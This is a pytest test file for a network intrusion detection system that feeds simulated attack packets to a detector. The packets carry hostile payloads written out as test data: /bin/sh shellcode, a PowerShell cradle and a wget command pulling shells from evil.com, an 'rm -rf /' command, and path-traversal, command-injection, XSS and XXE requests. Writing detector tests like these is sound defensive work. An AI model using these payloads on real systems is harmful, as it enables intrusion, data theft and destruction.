"""
Exploit attack scenario tests.
Tests for exploitation attempts, shellcode, and payload delivery attacks.
"""

import pytest
import time
import base64
from nids.features import FeatureExtractor
from nids.models import SimpleModelAdapter
from nids.alerts import AlertManager
from nids.schemas import PacketInfo, FlowKey


class TestExploitAttacks:
    """Test cases for exploit attack detection."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.extractor = FeatureExtractor(window_size=10, use_numba=False)
        self.model = SimpleModelAdapter()
        self.alert_manager = AlertManager(toast_enabled=False, min_confidence=0.5)
    
    def create_packet(self, src_ip="192.168.1.100", dst_ip="10.0.0.1", 
                     src_port=12345, dst_port=80, protocol="tcp", 
                     packet_size=1000, timestamp=None, **kwargs):
        """Create a test packet with default values."""
        defaults = {
            'timestamp': timestamp or time.time(),
            'src_ip': src_ip,
            'dst_ip': dst_ip,
            'src_port': src_port,
            'dst_port': dst_port,
            'protocol': protocol,
            'packet_size': packet_size,
            'payload_size': 500,
            'payload': b'Normal payload data',
            'tcp_flags': 0x18,  # PSH+ACK
            'ttl': 64
        }
        defaults.update(kwargs)
        return PacketInfo(**defaults)
    
    def generate_shellcode_payload(self) -> bytes:
        """Generate shellcode-like payload with high entropy."""
        # Simulated shellcode with NOP sled and encoded payload
        nop_sled = b'\x90' * 100  # NOP sled
        shellcode = bytes([
            0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,  # execve("/bin/sh")
            0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
            0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
        ])
        # Add high entropy data to simulate encoded payload
        import random
        random.seed(42)  # Deterministic for testing
        high_entropy_data = bytes([random.randint(0, 255) for _ in range(200)])
        return nop_sled + shellcode + high_entropy_data
    
    def generate_encoded_payload(self) -> bytes:
        """Generate encoded/encrypted payload."""
        # Base64 encoded malicious payload
        malicious_data = b"powershell -enc " + base64.b64encode(b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')")
        return malicious_data
    
    def test_buffer_overflow_exploit_typical(self):
        """Test typical buffer overflow exploit with shellcode."""
        base_time = time.time()
        packets = []
        
        # Create buffer overflow exploit packets
        for i in range(5):
            shellcode = self.generate_shellcode_payload()
            # Add some variation to the exploit
            exploit_payload = b'A' * (200 + i * 50) + shellcode + b'\x41\x41\x41\x41'  # Return address
            
            packet = self.create_packet(
                src_ip="192.168.1.100",
                dst_ip="10.0.0.1",
                src_port=12345 + i,
                dst_port=21,  # FTP - common target
                packet_size=len(exploit_payload) + 40,
                payload=exploit_payload,
                payload_size=len(exploit_payload),
                tcp_flags=0x18,
                timestamp=base_time + i * 0.5
            )
            packets.append(packet)
        
        # Process exploit packets
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should detect exploit patterns
        attack_predictions = [p for p in predictions if p.is_attack]
        assert len(attack_predictions) > 0, "Should detect buffer overflow exploits"
        
        # Check for high entropy (shellcode detection)
        high_entropy_packets = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            if features.payload_entropy > 7.0:
                high_entropy_packets.append(packet)
        
        assert len(high_entropy_packets) > 0, "Should detect high entropy shellcode"
    
    def test_web_exploit_typical(self):
        """Test typical web application exploits."""
        base_time = time.time()
        packets = []
        
        # Various web exploits
        web_exploits = [
            # Directory traversal
            b"GET /../../../../etc/passwd HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n",
            # Command injection
            b"GET /cgi-bin/test.cgi?cmd=;cat%20/etc/passwd HTTP/1.1\\r\\n\\r\\n",
            # XSS payload
            b"POST /comment HTTP/1.1\\r\\nContent-Length: 100\\r\\n\\r\\ntext=<script>alert(document.cookie)</script>",
            # File inclusion
            b"GET /index.php?page=http://evil.com/shell.txt HTTP/1.1\\r\\n\\r\\n",
            # XXE injection
            b"POST /xml HTTP/1.1\\r\\nContent-Type: application/xml\\r\\n\\r\\n<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        ]
        
        for i, exploit in enumerate(web_exploits):
            packet = self.create_packet(
                src_ip="192.168.1.100",
                dst_ip="10.0.0.1",
                src_port=20000 + i,
                dst_port=80,
                packet_size=len(exploit) + 40,
                payload=exploit,
                payload_size=len(exploit),
                tcp_flags=0x18,
                timestamp=base_time + i * 0.3
            )
            packets.append(packet)
        
        # Process web exploits
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should detect web exploits
        attack_predictions = [p for p in predictions if p.is_attack]
        assert len(attack_predictions) > 0, "Should detect web application exploits"
    
    def test_remote_code_execution_edge_case(self):
        """Test remote code execution attempts with encoded payloads."""
        base_time = time.time()
        packets = []
        
        # RCE attempts with various encoding
        rce_payloads = [
            # PowerShell encoded command
            self.generate_encoded_payload(),
            # Hex encoded payload
            b"GET /exec?cmd=" + b"\x2f\x62\x69\x6e\x2f\x73\x68".hex().encode() + b" HTTP/1.1\r\n\r\n",
            # URL encoded payload
            b"POST /run HTTP/1.1\\r\\n\\r\\ncmd=%2Fbin%2Fsh%20-c%20%22wget%20http%3A%2F%2Fevil.com%2Fshell%22",
            # Base64 in JSON
            b'{"command":"' + base64.b64encode(b"rm -rf / --no-preserve-root") + b'"}',
        ]
        
        for i, payload in enumerate(rce_payloads):
            packet = self.create_packet(
                src_ip="192.168.1.200",
                dst_ip="10.0.0.50",
                src_port=30000 + i,
                dst_port=8080,  # Web service
                packet_size=len(payload) + 40,
                payload=payload,
                payload_size=len(payload),
                tcp_flags=0x18,
                timestamp=base_time + i * 0.4
            )
            packets.append(packet)
        
        # Process RCE attempts
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should detect encoded RCE attempts
        attack_predictions = [p for p in predictions if p.is_attack]
        assert len(attack_predictions) > 0, "Should detect remote code execution attempts"
    
    def test_privilege_escalation_malformed(self):
        """Test privilege escalation exploits with malformed data."""
        base_time = time.time()
        packets = []
        
        # Privilege escalation attempts
        privesc_payloads = [
            # Malformed sudo exploit
            b"sudo " + b"A" * 1000 + b" /bin/sh\\n",
            # SUID exploit attempt
            b"/usr/bin/passwd " + b"\x00" * 500 + b"root\n",
            # Kernel exploit payload
            b"\x7fELF" + b"\x90" * 200 + b"\xCC" * 100,  # ELF header + NOP + int3
            # Malformed privilege request
            b"su - " + b"\xFF" * 100 + b"\x00root\n",
        ]
        
        for i, payload in enumerate(privesc_payloads):
            packet = self.create_packet(
                src_ip="192.168.1.150",
                dst_ip="10.0.0.100",
                src_port=40000 + i,
                dst_port=22,  # SSH
                packet_size=len(payload) + 40,
                payload=payload,
                payload_size=len(payload),
                tcp_flags=0x18,
                timestamp=base_time + i * 0.6
            )
            packets.append(packet)
        
        # Process privilege escalation attempts
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should handle malformed privilege escalation
        assert len(predictions) == len(privesc_payloads), "Should process all privilege escalation packets"
        
        # Check for unusual patterns
        for packet in packets:
            features = self.extractor.extract_features(packet)
            # Should detect unusual byte patterns
            assert features.payload_entropy >= 0.0, "Should calculate entropy for malformed data"
    
    def test_memory_corruption_exploit_typical(self):
        """Test memory corruption exploits with heap/stack manipulation."""
        base_time = time.time()
        packets = []
        
        # Memory corruption patterns
        corruption_patterns = [
            # Heap spray
            b"\x0C\x0C\x0C\x0C" * 400,  # Heap spray pattern
            # Stack pivot
            b"A" * 1000 + b"\x41\x41\x41\x41" + b"\x90" * 100,
            # Use-after-free exploit
            b"\xDE\xAD\xBE\xEF" * 300 + b"\x90\x90\x90\x90",
            # Format string exploit
            b"%08x." * 200 + b"%n",
            # Integer overflow
            b"\xFF\xFF\xFF\xFF" * 250,
        ]
        
        for i, pattern in enumerate(corruption_patterns):
            packet = self.create_packet(
                src_ip="192.168.1.100",
                dst_ip="10.0.0.1",
                src_port=50000 + i,
                dst_port=9999,  # Custom service
                packet_size=len(pattern) + 40,
                payload=pattern,
                payload_size=len(pattern),
                tcp_flags=0x18,
                timestamp=base_time + i * 0.3
            )
            packets.append(packet)
        
        # Process memory corruption exploits
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should detect memory corruption patterns
        attack_predictions = [p for p in predictions if p.is_attack]
        assert len(attack_predictions) > 0, "Should detect memory corruption exploits"
        
        # Check for large payloads
        large_payloads = [p for p in packets if p.payload_size > 500]
        assert len(large_payloads) > 0, "Should have large exploit payloads"
    
    def test_cryptographic_attack_typical(self):
        """Test cryptographic attacks and cipher exploitation."""
        base_time = time.time()
        packets = []
        
        # Cryptographic attack patterns
        crypto_attacks = [
            # SSL/TLS downgrade attack
            b"\x16\x03\x00\x00\x4a" + b"\x01" * 100,  # TLS 1.0 ClientHello
            # Weak cipher negotiation
            b"\x16\x03\x01\x00\x50" + b"\x00\x04\x00\x05" * 20,  # Weak ciphers
            # Certificate manipulation
            b"\x16\x03\x03\x00\x80" + b"\x0B" + b"\x00" * 127,  # Malformed cert
            # Padding oracle attack
            b"\x17\x03\x03\x00\x20" + b"\xFF" * 32,  # Bad padding
        ]
        
        for i, attack in enumerate(crypto_attacks):
            packet = self.create_packet(
                src_ip="192.168.1.100",
                dst_ip="10.0.0.1",
                src_port=60000 + i,
                dst_port=443,  # HTTPS
                packet_size=len(attack) + 40,
                payload=attack,
                payload_size=len(attack),
                tcp_flags=0x18,
                timestamp=base_time + i * 0.5
            )
            packets.append(packet)
        
        # Process cryptographic attacks
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should handle cryptographic attacks
        assert len(predictions) == len(crypto_attacks), "Should process all crypto attacks"
        
        # Check TLS feature detection
        for packet in packets:
            features = self.extractor.extract_features(packet)
            # TLS packets should be detected
            if packet.dst_port == 443:
                assert features.tls_sni_present is not None, "Should analyze TLS packets"
    
    def test_exploit_chaining_edge_case(self):
        """Test exploit chaining - multiple exploits in sequence."""
        base_time = time.time()
        packets = []
        
        # Exploit chain: reconnaissance -> vulnerability discovery -> exploitation
        
        # 1. Initial reconnaissance
        recon_packet = self.create_packet(
            src_ip="192.168.1.100",
            dst_ip="10.0.0.1",
            src_port=12345,
            dst_port=80,
            payload=b"GET /admin HTTP/1.1\\r\\n\\r\\n",
            payload_size=23,
            timestamp=base_time
        )
        packets.append(recon_packet)
        
        # 2. Vulnerability probing
        probe_packet = self.create_packet(
            src_ip="192.168.1.100",
            dst_ip="10.0.0.1",
            src_port=12345,
            dst_port=80,
            payload=b"GET /admin/../../../../etc/passwd HTTP/1.1\\r\\n\\r\\n",
            payload_size=50,
            timestamp=base_time + 1.0
        )
        packets.append(probe_packet)
        
        # 3. Exploit delivery
        exploit_payload = self.generate_shellcode_payload()
        exploit_packet = self.create_packet(
            src_ip="192.168.1.100",
            dst_ip="10.0.0.1",
            src_port=12345,
            dst_port=80,
            payload=b"POST /admin/upload HTTP/1.1\\r\\nContent-Length: " + str(len(exploit_payload)).encode() + b"\\r\\n\\r\\n" + exploit_payload,
            payload_size=len(exploit_payload) + 50,
            timestamp=base_time + 2.0
        )
        packets.append(exploit_packet)
        
        # 4. Post-exploitation
        post_packet = self.create_packet(
            src_ip="192.168.1.100",
            dst_ip="10.0.0.1",
            src_port=12346,  # New connection
            dst_port=4444,   # Reverse shell port
            payload=b"id; uname -a; whoami\\n",
            payload_size=20,
            timestamp=base_time + 3.0
        )
        packets.append(post_packet)
        
        # Process exploit chain
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should detect exploit chain
        attack_predictions = [p for p in predictions if p.is_attack]
        assert len(attack_predictions) > 0, "Should detect exploit chaining"
        
        # Check flow tracking across the chain
        flow_count = self.extractor.get_flow_count()
        assert flow_count >= 2, "Should track multiple flows in exploit chain"
    
    def test_exploit_alert_generation(self):
        """Test that exploit attacks generate appropriate alerts."""
        base_time = time.time()
        
        # Create high-confidence exploit
        shellcode = self.generate_shellcode_payload()
        packet = self.create_packet(
            src_ip="192.168.1.100",
            dst_ip="10.0.0.1",
            src_port=12345,
            dst_port=21,
            packet_size=len(shellcode) + 40,
            payload=shellcode,
            payload_size=len(shellcode),
            tcp_flags=0x18,
            timestamp=base_time
        )
        
        # Process and generate alert
        features = self.extractor.extract_features(packet)
        prediction = self.model.predict(features)
        
        if prediction.is_attack:
            alert = self.alert_manager.generate_alert(prediction)
            
            if alert:
                # Check alert properties
                assert alert.attack_type in ["DoS", "Exploits", "Generic"], f"Unexpected attack type: {alert.attack_type}"
                assert alert.severity in ["low", "medium", "high", "critical"], f"Invalid severity: {alert.severity}"
                assert alert.confidence > 0.0, "Alert confidence should be positive"
                assert "192.168.1.100" in alert.source_ip, "Should identify correct source IP"
                
                # Exploit alerts should suggest investigation
                assert any(word in alert.recommended_action.lower() for word in ["investigate", "payload", "block"]), "Should suggest investigation"
    
    def test_zero_day_exploit_simulation(self):
        """Test zero-day exploit simulation with unknown patterns."""
        base_time = time.time()
        packets = []
        
        # Simulate zero-day exploits with novel patterns
        zero_day_patterns = [
            # Novel shellcode encoding
            bytes([b ^ 0xAA for b in self.generate_shellcode_payload()]),  # XOR encoded
            # Unknown protocol exploitation
            b"\\x42\\x42\\x42\\x42" + b"\\x90" * 300 + b"\\xCC" * 50,  # Custom protocol
            # Polymorphic payload
            b"\\x90\\x90" + bytes([(i * 7) % 256 for i in range(500)]),  # Generated pattern
            # Encrypted payload
            b"\\x00\\x01\\x02\\x03" + bytes([(i * i) % 256 for i in range(600)]),  # Encrypted-like
        ]
        
        for i, pattern in enumerate(zero_day_patterns):
            packet = self.create_packet(
                src_ip="192.168.1.250",
                dst_ip="10.0.0.250",
                src_port=65000 + i,
                dst_port=31337,  # Non-standard port
                packet_size=len(pattern) + 40,
                payload=pattern,
                payload_size=len(pattern),
                tcp_flags=0x18,
                timestamp=base_time + i * 0.8
            )
            packets.append(packet)
        
        # Process zero-day simulations
        predictions = []
        for packet in packets:
            features = self.extractor.extract_features(packet)
            prediction = self.model.predict(features)
            predictions.append(prediction)
        
        # Should handle unknown patterns
        assert len(predictions) == len(zero_day_patterns), "Should process all zero-day patterns"
        
        # Check entropy detection for encoded payloads
        high_entropy_count = 0
        for packet in packets:
            features = self.extractor.extract_features(packet)
            if features.payload_entropy > 6.0:
                high_entropy_count += 1
        
        assert high_entropy_count > 0, "Should detect high entropy in encoded payloads"